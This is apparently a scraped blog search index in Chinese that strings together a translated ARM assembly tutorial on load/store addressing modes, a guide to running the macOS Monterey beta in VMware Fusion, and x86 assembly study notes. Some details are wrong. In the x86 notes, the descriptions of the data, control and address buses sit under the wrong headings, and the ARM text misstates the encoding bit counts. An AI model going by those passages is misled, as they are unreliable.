\u003c+12\u003e: str r2, [r1] 0x00008084 \u003c+16\u003e: bx lr End of assembler dump. 我们在前两个 LDR 操作中指定的标签更改为 [pc， #12]。这称为 PC 相对寻址。由于我们使用了标签，因此编译器计算了文本池 （PC+12） 中指定的值的位置。您可以使用这种确切的方法自行计算位置，也可以使用我们之前所做的标签。唯一的区别是，您需要计算值在文本池中的确切位置，而不是使用标签。在本例中，它距离有效 PC 位置有 3 个跃点 （4+4+4=12）。本章后面将详细介绍 PC 相对寻址。 附注：如果您忘记了为什么有效PC位于当前PC之前的两个说明中，则在第2部分中进行了描述[…在执行期间，PC 将当前指令的地址加上 8（两条 ARM 指令）存储在 ARM 状态，并将当前指令加 4（两条 Thumb 指令）的地址存储在 Thumb 状态。这与x86不同，在x86中，PC始终指向要执行的下一条指令…]。 ","date":"2021-12-26","objectID":"/zh-cn/26/:0:0","tags":[],"title":"偏移形式：即时值作为偏移量","uri":"/zh-cn/26/"},{"categories":[],"content":"1.**偏移形式：**即时值作为偏移量 STR Ra, [Rb, imm] LDR Ra, [Rc, imm] 在这里，我们使用即时（整数）作为偏移量。从基本寄存器（以下示例中的 R1）中添加或减去此值，以在编译时已知的偏移量访问数据。 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ load the memory address of var1 via label adr_var1 into R0 ldr r1, adr_var2 @ load the memory address of var2 via label adr_var2 into R1 ldr r2, [r0] @ load the value (0x03) at memory address found in R0 to register R2 str r2, [r1, #2] @ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 plus 2. Base register (R1) unmodified. str r2, [r1, #4]! @ address mode: pre-indexed. Store the value found in R2 (0x03) to the memory address found in R1 plus 4. Base register (R1) modified: R1 = R1+4 ldr r3, [r1], #4 @ address mode: post-indexed. Load the value at memory address found in R1 to register R3. Base register (R1) modified: R1 = R1+4 bkpt adr_var1: .word var1 adr_var2: .word var2 让我们调用这个程序ldr.s，编译它并在GDB中运行它，看看会发生什么。 $ as ldr.s -o ldr.o $ ld ldr.o -o ldr $ gdb ldr 在GDB（使用gef）中，我们在_start处设置一个断点并运行程序。 gef\u003e break _start gef\u003e run ... gef\u003e nexti 3 /* to run the next 3 instructions */ 我的系统上的寄存器现在填充了以下值（请记住，这些地址在您的系统上可能不同）： $r0 : 0x00010098 -\u003e 0x00000003 $r1 : 0x0001009c -\u003e 0x00000004 $r2 : 0x00000003 $r3 : 0x00000000 $r4 : 0x00000000 $r5 : 0x00000000 $r6 : 0x00000000 $r7 : 0x00000000 $r8 : 0x00000000 $r9 : 0x00000000 $r10 : 0x00000000 $r11 : 0x00000000 $r12 : 0x00000000 $sp : 0xbefff7e0 -\u003e 0x00000001 $lr : 0x00000000 $pc : 0x00010080 -\u003e \u003c_start+12\u003e str r2, [r1] $cpsr : 0x00000010 下一条指令，将使用偏移地址模式执行 STR 操作。它将存储从 R2 （0x00000003） 到 R1 （0x0001009c） + 偏移量 （#2） = 0x1009e 中指定的内存地址的值。 gef\u003e nexti gef\u003e x/w 0x1009e 0x1009e \u003cvar2+2\u003e: 0x3 下一个 STR 操作使用预索引地址模式。您可以通过感叹号（！）来识别此模式。唯一的区别是，基本寄存器将使用存储 R2 值的最终内存地址进行更新。这意味着，我们将 R2 （0x3） 中找到的值存储到 R1 （0x1009c） + 偏移量 （#4） = 0x100A0 中指定的内存地址，并使用此确切地址更新 R1。 gef\u003e nexti gef\u003e x/w 0x100A0 0x100a0: 0x3 gef\u003e info register r1 r1 0x100a0 65696 最后一个 LDR 操作使用索引后地址模式。这意味着基寄存器（R1）被用作最终地址，然后使用用R1 + 4计算的偏移量进行更新。换句话说，它获取在 R1（不是 R1+4）中找到的值（该值0x100A0并将其加载到 R3 中，然后将 R1 更新为 R1 （0x100A0） + 偏移量 （#4） = 0x100a4。 gef\u003e info register r1 r1 0x100a4 65700 gef\u003e info register r3 r3 0x3 3 以下是正在发生的事情的抽象说明： ","date":"2021-12-26","objectID":"/zh-cn/26/:0:1","tags":[],"title":"偏移形式：即时值作为偏移量","uri":"/zh-cn/26/"},{"categories":[],"content":"2.**偏移形式：**注册为偏移量。 STR Ra, [Rb, Rc] LDR Ra, [Rb, Rc] 此偏移形式使用寄存器作为偏移量。此偏移量窗体的一个用法示例是，当代码想要访问在运行时计算索引的数组时。 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ load the memory address of var1 via label adr_var1 to R0 ldr r1, adr_var2 @ load the memory address of var2 via label adr_var2 to R1 ldr r2, [r0] @ load the value (0x03) at memory address found in R0 to R2 str r2, [r1, r2] @ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 (0x03). Base register unmodified. str r2, [r1, r2]! @ address mode: pre-indexed. Store value found in R2 (0x03) to the memory address found in R1 with the offset R2 (0x03). Base register modified: R1 = R1+R2. ldr r3, [r1], r2 @ address mode: post-indexed. Load value at memory address found in R1 to register R3. Then modify base register: R1 = R1+R2. bx lr adr_var1: .word var1 adr_var2: .word var2 在以偏移地址模式执行第一个STR运算后，R2（0x00000003）的值将存储在内存地址0x0001009c + 0x00000003 = 0x0001009F。 gef\u003e x/w 0x0001009F 0x1009f \u003cvar2+3\u003e: 0x00000003 具有预索引地址模式的第二个 STR 操作将执行相同的操作，不同之处在于它将使用计算的内存地址 （R1+R2） 更新基本寄存器 （R1）。 gef\u003e info register r1 r1 0x1009f 65695 最后一个 LDR 操作使用索引后地址模式，并将 R1 中找到的内存地址处的值加载到寄存器 R2 中，然后更新基本寄存器 R1 （R1+R2 = 0x1009f + 0x3 = 0x100a2）。 gef\u003e info register r1 r1 0x100a2 65698 gef\u003e info register r3 r3 0x3 3 ","date":"2021-12-26","objectID":"/zh-cn/26/:0:3","tags":[],"title":"偏移形式：即时值作为偏移量","uri":"/zh-cn/26/"},{"categories":[],"content":"3.偏移形式：缩放寄存器作为偏移量 LDR Ra, [Rb, Rc, \u003cshifter\u003e] STR Ra, [Rb, Rc, \u003cshifter\u003e] 第三个偏移形式具有缩放的寄存器作为偏移量。在这种情况下，Rb 是基寄存器，Rc 是左/右移位（）的即时偏移（或包含即时值的寄存器）以缩放即时。这意味着料筒移位器用于缩放偏移量。此偏移形式的一个示例用法是循环循环迭代数组。下面是一个可以在 GDB 中运行的简单示例： .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ load the memory address of var1 via label adr_var1 to R0 ldr r1, adr_var2 @ load the memory address of var2 via label adr_var2 to R1 ldr r2, [r0] @ load the value (0x03) at memory address found in R0 to R2 str r2, [r1, r2, LSL#2] @ address mode: offset. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 left-shifted by 2. Base register (R1) unmodified. str r2, [r1, r2, LSL#2]! @ address mode: pre-indexed. Store the value found in R2 (0x03) to the memory address found in R1 with the offset R2 left-shifted by 2. Base register modified: R1 = R1 + R2\u003c\u003c2 ldr r3, [r1], r2, LSL#2 @ address mode: post-indexed. Load value at memory address found in R1 to the register R3. Then modifiy base register: R1 = R1 + R2\u003c\u003c2 bkpt adr_var1: .word var1 adr_var2: .word var2 第一个STR操作使用偏移地址模式，并将在 R2 中找到的值存储在从**[r1， r2， LSL#2]**计算得出的内存位置，这意味着它将 R1 中的值作为基数（在本例中，R1 包含 var2 的内存地址），然后获取 R2 中的值（0x3）， 并将其左移 2。下图尝试可视化如何使用 [r1， r2， LSL#2] 计算内存位置。 第二个 STR 操作使用预索引地址模式。这意味着，它执行与上一个操作相同的操作，不同之处在于它之后使用计算的内存地址更新基本寄存器R1。换句话说，它将首先存储内存地址 R1 （0x1009c） + 偏移量由 #2 （0x03 LSL#2 = 0xC） = 0x100a8 找到的值，并使用 0x100a8 更新 R1。 gef\u003e info register r1 r1 0x100a8 65704 最后一个 LDR 操作使用索引后地址模式。这意味着，它将在 R1 中找到的内存地址（0x100a8）处的值加载到寄存器 R3 中，然后使用用 r2 LSL#2 计算的值更新基本寄存器 R1。换句话说，R1 使用值 R1 （0x100a8） + 偏移量 R2 （0x3） 左移 #2 （0xC） = 0x100b4 进行更新。 gef\u003e info register r1 r1 0x100b4 65716 ","date":"2021-12-26","objectID":"/zh-cn/26/:0:5","tags":[],"title":"偏移形式：即时值作为偏移量","uri":"/zh-cn/26/"},{"categories":[],"content":"总结 请记住 LDR/STR 中的三种偏移模式： 偏移模式使用即时偏移作为偏移 ldr r3， [r1， #4] 偏移模式使用寄存器作为偏移 ldr r3， [r1， r2] 偏移模式使用缩放寄存器作为偏移 ldr r3， [r1， r2， LSL#2] 如何记住 LDR/STR 中的不同地址模式： 如果有 ！，则为前缀地址模式 ldr r3， [r1， #4]！ ldr r3， [r1， r2]！ ldr r3， [r1， r2， LSL#2]！ 如果基本寄存器本身位于括号中，则它是后缀地址模式 ldr r3， [r1]， #4 ldr r3， [r1]， r2 ldr r3， [r1]， r2， LSL#2 其他任何内容都是偏移地址模式。 ldr r3， [r1， #4] ldr r3， [r1， r2] ldr r3， [r1， r2， LSL#2] 用于 PC 相对寻址的 LDR LDR 不仅用于将数据从存储器加载到寄存器中。有时你会看到这样的语法： .section .text .global _start _start: ldr r0, =jump /* load the address of the function label jump into R0 */ ldr r1, =0x68DB00AD /* load the value 0x68DB00AD into R1 */ jump: ldr r2, =511 /* load the value 511 into R2 */ bkpt 这些指令在技术上称为伪指令。我们可以使用此语法来引用文本池中的数据。文本池是同一部分中的内存区域（因为文本池是代码的一部分），用于存储常量、字符串或偏移量。在上面的示例中，我们使用这些伪指令来引用函数的偏移量，并在一条指令中将32位常量移动到寄存器中。我们有时需要使用此语法在一条指令中将32位常量移动到寄存器中的原因是，ARM只能一次性加载8位值。什么？要了解原因，您需要知道 ARM 上如何处理即时值。 在 ARM 上使用即时值 在 ARM 上的寄存器中加载即时值并不像在 x86 上那样简单。对可以使用哪些即时值有限制。这些限制是什么以及如何处理它们并不是ARM组装中最令人兴奋的部分，但请耐心等待，这只是为了您的理解，您可以使用一些技巧来绕过这些限制（提示：LDR）。 我们知道每个ARM指令的长度都是32位的，所有指令都是有条件的。我们可以使用16个条件代码，其中一个条件代码占用指令的4位。然后，我们需要 2 位用于目标寄存器。第一个操作数寄存器为 2 位，设置状态标志为 1 位，另外还有用于实际操作码等其他事项的各种位数。这里的要点是，在将位分配给指令类型，寄存器和其他字段之后，只剩下12位用于即时值，这将只允许4096个不同的值。 这意味着 ARM 指令只能直接对 MOV 使用有限范围的即时值。如果一个数字不能直接使用，则必须将其拆分为多个部分，并从多个较小的数字拼凑在一起。 但还有更多。这12位不是将12位作为单个整数，而是拆分为一个8位数（n），能够加载0-255范围内的任何8位值，而4位旋转字段（r）是0到30之间以2步长向右旋转。这意味着完整的即时值 v 由公式给出：v = n ror 2*r。换句话说，唯一有效的即时值是旋转字节（可以减少到一个字节并旋转一个偶数的值）。 以下是有效和无效即时值的一些示例： Valid values: #256 // 1 ror 24 --\u003e 256 #384 // 6 ror 26 --\u003e 384 #484 // 121 ror 30 --\u003e 484 #16384 // 1 ror 18 --\u003e 16384 #2030043136 // 121 ror 8 --\u003e 2030043136 #0x06000000 // 6 ror 8 --\u003e 100663296 (0x06000000 in hex) Invalid values: #370 // 185 ror 31 --\u003e 31 is not in range (0 – 30) #511 // 1 1111 1111 --\u003e bit-pattern can’t fit into one byte #0x06010000 // 1 1000 0001.. --\u003e bit-pattern can’t fit into one byte 这样做的结果是无法一次性加载完整的32位地址。我们可以通过使用以下两个选项之一来绕过此限制： 从较小的零件中构造更大的值 而不是使用MOV r0，#511 将 511 分为两部分：MOV r0、#256 和 ADD r0（#255） 使用负载构造’ldr r1，=值'，汇编程序将很乐意将其转换为MOV，或者如果不可能，则转换为PC相对负载。 LDR r1， =511 如果您尝试加载无效的即时值，汇编程序将抱怨并输出错误，指出：错误：无效常量。如果遇到此错误，您现在知道它的含义以及如何处理它。 假设您要将 #511 加载到 R0 中。 .section .text .global _start _start: mov r0, #511 bkpt 如果尝试组装此代码，汇编程序将引发错误： azeria@labs:~$ as test.s -o test.o test.s: Assembler messages: test.s:5: Error: invalid constant (1ff) after fixup 您需要将 511 拆分为多个部分，或者按照我之前描述的那样使用 LDR。 .section .text .global _start _start: mov r0, #256 /* 1 ror 24 = 256, so it's valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt 如果您需要确定某个数字是否可以用作有效的即时值，则无需自己计算。你可以使用我的小python脚本rotator.py它把你的号码作为输入，并告诉你它是否可以用作有效的即时号码。 azeria@labs:~$ python rotator.py Enter the value you want to check: 511 Sorry, 511 cannot be used as an immediate number and has to be split. azeria@labs:~$ python rotator.py Enter the value you want to check: 256 The number 256 can be used as a valid immediate number. 1 ror 24 --\u003e 256 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-26","objectID":"/zh-cn/26/:0:6","tags":[],"title":"偏移形式：即时值作为偏移量","uri":"/zh-cn/26/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 如何在 VMware Fusion 中运行 macOS Monterey （12） Beta macOS Monterey于6月7日宣布，当然，就像优秀的数字工作空间人员一样，我们进入了测试模式！在最初的Fusion测试期间，我们遇到了一些有趣的错误/延迟，我们已经在这里制定并记录了这些错误/延迟。因此，如果您试图让 Monterey 在 VMware Fusion 中工作并遇到一些问题，请继续阅读！ 下载安装macOS 12 Beta.app 后，我发现在Fusion中加载之前将其转换为ISO很有用。我还必须从虚拟机执行此操作，因为我的工作托管Mac会阻止我安装Beta，并且复制ISO比.app文件夹更可靠。 给 Frederik Abeloos 的帽子提示 – 旅行技术专家。 https://travellingtechguy.blog/macos-big-sur-on-vmware-fusion-12/整个过程在 Big Sur VM 中花费了大约 5 分钟，我的终端输出看起来像这样。 我们最终获得了17.83GB的ISO。经过反复试验，这可以归结为略高于13GB。 安装 macOS 12 Beta 应用后，请逐个执行以下步骤。 hdiutil create -o /tmp/Monterey -size 13350m -volname Monterey -layout SPUD -fs HFS+J hdiutil attach /tmp/Monterey.dmg -noverify -mountpoint /Volumes/Monterey sudo /Applications/Install\\ macOS\\ 12\\ Beta.app/Contents/Resources/createinstallmedia --volume /Volumes/Monterey --nointeraction sudo hdiutil detach /Volumes/Install\\ macOS\\ 12\\ Beta (-force if needed) hdiutil convert /tmp/Monterey.dmg -format UDTO -o ~/Desktop/Monterey.cdr mv ~/Desktop/Monterey.cdr ~/Desktop/Monterey.iso Optional (to free up space): rm /tmp/Monterey.dmg 如果从 createinstallmedia 命令收到任何大小错误，要求更多空间，请删除初始 DMG 并相应地增加 13350m 大小。 完成此操作后，即可开始在 Fusion 中构建 VM。 ","date":"2021-12-23","objectID":"/zh-cn/23-2/:0:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"步骤 1 – 生成 VM 我在 VMware Fusion Professional Version 12.1.2 （17964953） 中完成了所有测试。 加载 ISO，然后选择您的操作系统。选择 macOS 11。 当您到达\"完成\"页面时。不要单击\"完成\"。单击\"自定义设置\"。 需要 VM 磁盘上大约 80GB 的空间，以便进行升级等。 设置 VM 的文件名。它将默认为macOS 11.0，我将我的更改为12.0 Beta。 接下来，在\"设置\"中，将\"网络适配器\"更改为\"已禁用\"，并将\"桥接模式网络\"设置为\"自动检测\"。 关闭这些选项，将留下一个已关闭电源的 VM。不要打开电源！ ","date":"2021-12-23","objectID":"/zh-cn/23-2/:1:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"步骤 2 – 设置 VMX 设置 首先，我们需要更改一个选项，并设置一些新的选项。 从虚拟机资源库中，找到新的 macOS 12 Beta 虚拟机。按住 Option 键，然后右键单击 VM。 首先，搜索\"board-id.reflectHost\"并将其从\"真\"设置为\"假\"。 board-id.reflectHost = \"FALSE\" 接下来，我们需要根据要反射到 VM 的设备设置主板 ID 和硬件型号。您可以在此处找到主板 ID 和硬件型号的列表。https://mrmacintosh.com/list-of-mac-boardid-deviceid-model-identifiers-machine-models/.如果要 MDM 注册 VM，这些非常重要，这有助于 VM 提供\"正确\"的版本信息。 board-id = \"Mac-551B86E5744E2388\" hw.model.reflectHost = \"FALSE\" hw.model = \"MacBookPro14,3\" 接下来，我们需要设置序列号。这可以是 Apple 商务管理中用于测试自动注册流程的 Mac 的序列号。或者，它可以是您正在使用的 Mac 的序列号。或者，它可能是一堆乱七八糟的角色！ serialNumber.reflectHost = \"FALSE\" serialNumber = \"C00000000000\" 接下来，我们需要添加2个选项来处理一些显示问题。非常感谢斯科特·奈特在这里的小费！如果需要，这可以让您访问登录窗口（我仍然建议稍后进行自动登录更改！ 注意：有些人报告说，如果您在运行设置助理之前添加这些问题，可能会导致问题。如果您有模糊的屏幕/崩溃与这些，请删除并重新启动。 svga.present=\"FALSE\" appleGPU0.present=\"TRUE\" 最后，一个非常重要的不寻常的步骤 在此版本中，如果我们不使用 NIC 类型\"vmxnet3\"，则在获取 VM 中的 IP 地址时会出现问题。找到下面的（搜索\"virtualDev\"或\"e1000e\"）。 ethernet0.virtualDev = \"e1000e\" 将\"e1000e\"替换为\"vmxnet3\"。 ethernet0.virtualDev = \"vmxnet3\" 现在，您可以保存并退出该文件。为了更好地衡量，我退出并重新启动了Fusion。 感谢此讨论线程提供有关 NIC 更改的一些建议。并感谢迈克尔·罗伊（Michael Roy）的内部推动！https://communities.vmware.com/t5/VMware-Fusion-Discussions/How-do-I-specify-Network-Adapter-to-be-vmxnet3-in-Fusion/td-p/2667194 ","date":"2021-12-23","objectID":"/zh-cn/23-2/:2:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"步骤 3 – 安装操作系统 现在，可以启动 VM 并运行安装步骤。 选择您的语言 选择安装 macOS 测试版。无需在磁盘实用程序中执行任何操作 ","date":"2021-12-23","objectID":"/zh-cn/23-2/:3:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"步骤 4 – 设置助理 现在，当您登陆设置助理时。关闭 VM，然后拍摄快照。这是您的预设置快照，如果您需要更改序列号或重新设置，可以返回该快照。 然后，可以启动 VM 并开始使用。我在这里的第一条建议是，耐心！至少对我来说，这是非常缓慢的。坚持下去，你就会到达那里。 完成所有步骤，您应该进入帐户创建屏幕，然后登陆桌面。 !!!重要步骤!!!– 当您点击桌面时，请按照以下过程操作 – 不要关机或执行任何其他操作： 前往\"系统偏好设置\"/“用户与群组”。单击\"登录选项\"，然后单击挂锁。使用您的新密码进行身份验证。 将\"自动登录\"设置为您的用户名。 这样做的原因是登录窗口似乎存在问题，使您陷入登录循环/黑屏。 ","date":"2021-12-23","objectID":"/zh-cn/23-2/:4:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"第5步 - 去喝杯啤酒，你完成了。 现在可以安装 VMtools（接受所有安全和隐私提示，重新启动）、关闭，并在安装后点拍摄另一个快照，以便返回到干净的 VM。 请关机并拍摄另一张快照！然后，如果您注册了MDM，请在注册后拍摄另一张快照。我让 VM 进入睡眠状态，但无法将其唤醒，即使在重新启动后也是如此！我的\"全新安装 + VMtools\"快照为我节省了大量时间。 感谢霍华德·布利斯为登录窗口提供提示！ 如果有任何更改，我们将尝试更新指南，如果您有任何问题，请与我联系！@adampmatthews和@adammatthews MacAdmins松弛。 ","date":"2021-12-23","objectID":"/zh-cn/23-2/:5:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":[],"content":"故障 排除 如果您看到以下内容，则表示您尚未将 NIC 更改为 vmxnet3。 如果您重新启动并且屏幕模糊，并且某些内核崩溃重新启动，如下所示： 只要继续重新启动，它应该会自行清除。如果您在登陆\"设置助理\"（或崩溃屏幕）之前看到此屏幕，请从 VMX 中删除 GPU 选项。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-23","objectID":"/zh-cn/23-2/:6:0","tags":[],"title":"如何在 VMware Fusion 中运行 macOS Monterey （12） Beta","uri":"/zh-cn/23-2/"},{"categories":["汇编"],"content":"此文为加密收费内容添加我微信支付后可看: $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # 汇编学习 IA-32处理器结构 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:0:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"寄存器 *寄存器进行信息存储* AX，BX，CX，DX，SP，BP，SI，DI，IP，FLAG，CS，DS，SS，ES 共 14 个,均为16位 而这 14 个寄存器分为通用寄存器，控制寄存器和段寄存器 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:1:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"通用寄存器： 数据寄存器： AX (Accumulator)：累加寄存器，也称之为累加器 BX (Base)：基地址寄存器 CX (Count)：计数器寄存器 DX (Data)：数据寄存器 *上面 4 个数据寄存器可以分为两个独立的 8 位寄存器* 指针寄存器： SP (Stack Pointer)：堆栈指针寄存器 BP (Base Pointer)：基指针寄存器 变址寄存器： SI (Source Index)：源变址寄存器 DI (Destination Index)：目的变址寄存器 控制寄存器： IP (Instruction Pointer)：指令指针寄存器 FLAG：标志寄存器 标志位（外语缩写） 标志位名称及外语全称 =1 =0 CF 进位标志/Carry Flag CY/Carry/进位 NC/No Carry/无进位 PF 奇偶标志/Parity Flag PE/Parity Even/偶 PO/Parity Odd/奇 AF 辅助进位标志/Auxiliary Carry Flag AC/Auxiliary Carry/进位 NA/No Auxiliary Carry/无进位 ZF 零标志/Zero Flag ZR/Zero/等于零 NZ/Not Zero/不等于零 SF 符号标志/Sign Flag NG/Negative/负 PL/Positive/非负 TF 跟踪标志/Trace Flag IF 中断标志/Interrupt Flag EI/Enable Interrupt/允许 DI/Disable Interrupt/禁止 DF 方向标志/Direction Flag DN/Down/减少 UP/增加 OF 溢出标志/Overflow Flag OV/Overflow/溢出 NV/Not Overflow/未溢出 　条件标志： 进位标志：用于反映运算是否产生进位或借位如果运算结果的最高位产生一个进位或借位，则CF置1，否则置0运算结果的最高位包括字操作的第15位和字节操作的第7位移位指令也会将操作数的最高位或最低位移入CF 奇偶标志：用于反映运算结果低8位中“1”的个数“1”的个数为偶数，则PF置1，否则置0 辅助进位标志：算数操作结果的第三位（从0开始计数）如果产生了进位或者借位则将其置为1，否则置为0，常在BCD(binary-codedecimal)算术运算中被使用 零标志：用于判断结果是否为0运算结果0，ZF置1，否则置0 符号标志：用于反映运算结果的符号，运算结果为负，SF置1，否则置0因为有符号数采用补码的形式表示，所以SF与运算结果的最高位相同 溢出标志：反映有符号数加减运算是否溢出如果运算结果超过了8位或者16位有符号数的表示范围，则OF置1，否则置0 控制标志： 跟踪标志：当TF被设置为1时，CPU进入单步模式，所谓单步模式就是CPU在每执行一步指令后都产生一个单步中断主要用于程序的调试8086/8088中没有专门用来置位和清零TF的命令，需要用其他办法 中断标志：决定CPU是否响应外部可屏蔽中断请求IF为1时，CPU允许响应外部的可屏蔽中断请求 方向标志：决定串操作指令执行时有关指针寄存器调整方向当DF为1时，串操作指令按递减方式改变有关存储器指针值，每次操作后使SI、DI递减 段寄存器： CS (Code Segment)：代码段寄存器 DS (Data Segment)：数据段寄存器 SS (Stack Segment)：堆栈段寄存器 ES (Extra Segment)：附加段寄存器 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:1:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"高频时钟 进行同步 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:2:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"控制单元 控制器控制各种器件进行工作 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:3:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"算术单元 运算器进行信息处理 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:4:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"三大总线 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:5:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"数据总线 CPU是通过地址总线指定存储单元，地址总线传送的能力决定了CPU对存储单元的寻址能力。(一般32位CPU，寻址能力为2^32=4G) ","date":"2021-12-22","objectID":"/zh-cn/23-1/:5:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"控制总线 CPU通过数据总线来与内存等器件进行数据传送，数据总线的宽度决定了CPU和外界的数据传送速度 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:5:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"地址总线 控制总线是一些不同控制的集合，CPU通过控制总线对外部器件的控制。控制总线的宽度决定了CPU对外部器件的控制能力 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:5:3","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"指令执行周期 Fetch（取指），也就是从 PC 寄存器里找到对应的指令地址，根据指令地址从内存里把具体的指令，加载到指令寄存器中，然后把 PC 寄存器自增，好在未来执行下一条指令 Decode（译码），也就是根据指令寄存器里面的指令，解析成要进行什么样的操作，是 R、I、J 中的哪一种指令，具体要操作哪些寄存器、数据或者内存地址 Execute（执行），也就是实际运行对应的 R、I、J 这些特定的指令，进行算术逻辑操作、数据传输或者直接的地址跳转 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:6:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"读取内存周期 地址总线: 将想要读取的值的地址放到地址总线上 控制总线: 设置处理器RD引脚 等待存储器响应 数据总线: 将数据从数据总线复制到目标操作数 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:7:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"操作模式 主要操作模式: 保护模式 实地址模式 系统管理模式 子模式: 虚拟8086模式 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:8:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"汇编语言基础 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:0","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"整形常量 最后一位需要用基数来申明进制, 默认为10进制 基数 进制 h 16 q/o 8 d 10 b 2 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:1","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"字符常量 单引号或双引号包含的字符, 内存中保存的asc码 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:2","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"字符常量 单引号或双引号包含的字符序列, 内存中保存的asc码 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:3","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"保留字 指令助记符 寄存器名称 伪指令 属性 运算符 预定义符号 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:4","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"标识符 类似高级语言的变量名 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:5","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"伪指令 嵌入源代码的命令,由汇编器识别、执行 不在运行时执行,但可以定义变量、宏和子程序,为内存分派名称 ","date":"2021-12-22","objectID":"/zh-cn/23-1/:9:6","tags":["汇编"],"title":"汇编学习","uri":"/zh-cn/23-1/"},{"categories":["汇编"],"content":"指令 标号(可选) 指令助记符 操作数 注释(可选) 